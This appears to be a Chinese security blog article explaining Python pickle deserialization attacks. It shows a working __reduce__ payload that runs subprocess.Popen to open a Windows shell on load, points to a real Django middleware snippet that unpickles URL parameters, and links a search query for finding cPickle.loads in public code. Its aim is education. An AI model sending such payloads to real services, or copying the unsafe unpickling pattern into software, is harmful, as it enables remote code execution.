# Python Pickle反序列化带来的安全问题

**0x00 前言**

数据序列化，这是个很常见的应用场景，通常被广泛应用在数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。主要作用是为了能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。

然而安全问题也常常出现在这里。随手点点就有，PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、当然，还有最近Ruby on Rails的xml/yaml。

而这里的问题，不发生则已，一发生，则通常就是个天大的0day：远程代码执行。

原因为何？和我们的第一段所说的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数__wakeup。

无论哪种，都是可能被有心人利用，从而接管流程，让框架让语言执行到他们的代码的。往深入了讲，往“道”的方向提升，这种模式是计算机从诞生之日就存在的原罪之一：**“数据和操作指令保存在一起不加区分，从而很容易被误解。”**

仔细想想，缓冲区溢出（数据覆盖了内存的其他区域被当作操作指令执行），SQL注入（数据被当作控制语句的一部分被执行），XSS（同sql注入）。哪一种大的安全问题不是这个原罪造成的？

**0x01 细解**

好了，扯了这么多，跑题的严重，还是言归正传吧。

我们知道各大语言都有其序列化数据的方式，Python当然也有，官方库里提供了一个叫做pickle/cPickle的库，这两个库的作用和使用方法都是一致的，只是一个用纯py实现，另一个用c实现而已。使用起来也很简单，基本和PHP的serialize/unserialize方法一样：

```
import cPickle 

data = "test" 
packed = cPickle.dumps(data) # 序列化 
data = cPickle.loads(packed) # 反序列化 

>>> packed 
"S'test'\np1\n."

```

同样pickle可以序列化python的任何数据结构，包括一个类，一个对象：

```
>>> class A(object): 
...     a = 1 
...     b = 2 
...     def run(self): 
...         print self.a, self.b 
... 
>>> cPickle.dumps(A()) 
'ccopy_reg\n_reconstructor\np1\n(c__main__\nA\np2\nc__builtin__\nobject\np3\nNtRp4\n.'

```

这里可以看到，连code都被序列化进去了。如果我们这个run函数是可以被自动执行的，那就可以形成一个很完美的远程执行。

如何让run函数被自动执行呢？类似于php的wakeup魔术方法，python也有其自己的方法，例如__reduce，可以在被反序列化的时候执行。具体内容请参考Python的官方库文档。而且并不止这一个函数。

我们利用**reduce**做一个测试：

```
>>> class A(object): 
...     a = 1 
...     b = 2 
...     def __reduce__(self): 
...         return (subprocess.Popen, (('cmd.exe',),)) 
... 
>>> cPickle.dumps(A()) 
"csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n."

```

然后新开一个py的命令行，模拟是接收方：

```
>>> cPickle.loads("csubprocess\nPopen\np1\n((S'cmd.exe'\np2\ntp3\ntp4\nRp5\n.") 
<subprocess.Popen object at 0x00BB8DD0> 
>>> Microsoft Windows XP [版本 5.1.2600] 
(C) 版权所有 1985-2001 Microsoft Corp. 

C:\Documents and Settings\testuser>exit
Use exit() or Ctrl-Z plus Return to exit 
>>>

```

bingo，很完美的一个shell，不是么：）

只要你可以控制序列化中的内容，就可以让接收方去执行你提供的代码。

**0x02 实例**

那么现实中是否有类似的代码呢？[请灵活使用google](https://www.google.com.hk/#hl=zh-CN&q=cPickle.loads(+site:github.com&oq=cPickle.loads(+site:github.com&fp=16ca8e5436e5cdb6)

我这里随便搜了一个很有代表性的代码：[http://djangosnippets.org/snippets/2126/](http://djangosnippets.org/snippets/2126/)

```
def unpickle_stats(stats): 
    """Unpickle a pstats.Stats object""" 
    stats = cPickle.loads(stats) **#注意这里** 
    stats.stream = True 
return stats

def process_request(self, request): 
        """  Setup the profiler for a profiling run and clear the SQL query log. 

  If this is a resort of an existing profiling run, just return  the resorted list.  """ 
        def unpickle(params): 
            stats = unpickle_stats(b64decode(params.get('stats', ''))) #这里直接从url参数中获取了 
            queries = cPickle.loads(b64decode(params.get('queries', ''))) #这里也是 
            return stats, queries 

        if request.method != 'GET' and \ 
           not (request.META.get('HTTP_CONTENT_TYPE', 
                                 request.META.get('CONTENT_TYPE', '')) in 
                ['multipart/form-data', 'application/x-www-form-urlencoded']): 
            return 
        if (request.REQUEST.get('profile', False) and 
            (settings.DEBUG == True or request.user.is_staff)): 
            request.statsfile = tempfile.NamedTemporaryFile() 
            params = request.REQUEST 
            if (params.get('show_stats', False) 
                and params.get('show_queries', '1') == '1'): 
                # Instantly re-sort the existing stats data 
                stats, queries = unpickle(params) # 这里调用了

```

这是某个开发者写的django middleware的代码，很easy被利用，不是么?

另外我在ibm上也看到有类似的教程使用了同样的代码，也可以被利用：[http://www.ibm.com/developerworks/cn/education/grid/gr-pyth3/section4.html](http://www.ibm.com/developerworks/cn/education/grid/gr-pyth3/section4.html)